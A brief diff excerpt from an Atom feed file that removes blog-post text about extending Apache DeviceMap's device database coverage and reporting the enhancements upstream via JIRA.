-DeviceMap. Further, we managed to increase its coverage up to 99% by
-introducing some entries manually to do the database. Indeed, we
-&lt;a href="https://issues.apache.org/jira/browse/DMAP-104?jql=reporter%20in%20(vy)"&gt;reported&lt;/a&gt;
-a majority of those enhancements back to the Apache DeviceMap project.&lt;/p&gt;
 </content>
   </entry>
 </feed>
